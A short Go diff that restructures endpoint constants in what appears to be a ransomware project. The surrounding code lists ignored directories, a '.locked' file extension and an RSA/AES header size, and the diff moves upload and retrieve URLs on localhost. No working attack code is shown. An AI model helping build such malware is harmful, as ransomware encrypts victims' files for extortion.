@@ -29,6 +29,19 @@ var IgnoreDirs = [...]string{
 	".",
 }
 
+type ServerConfig struct {
+	Host string
+	Port int
+}
+
+var (
+	// TODO: server use viper.
+	// Endpoint web server URL
+	UploadEndpoint = "http://localhost:8080/upload"
+
+	RetrieveEndpoint = "http://localhost:8080/retrieve"
+)
+
 const (
 	// LockedExtension to append to file name when encrypted
 	LockedExtension = ".locked"
@@ -45,12 +58,4 @@ const (
 	// EncryptedHeaderSize I don't know how to calculate the length of RSA ciphertext, but with KeySize + aes.BlockSize it'll be 128 bytes
 	// Check this if changing AES keysize or RSA bit size
 	EncryptedHeaderSize int = 128
-
-	// Endpoint web server URL
-	UploadEndpoint = "http://localhost:8080/upload"
-
-	RetrieveEndpoint = "http://localhost:8080/retrieve"
-
-	TCPEndpoint = "http://localhost:8080/retrieve"
-	// TODO: use viper.
 )
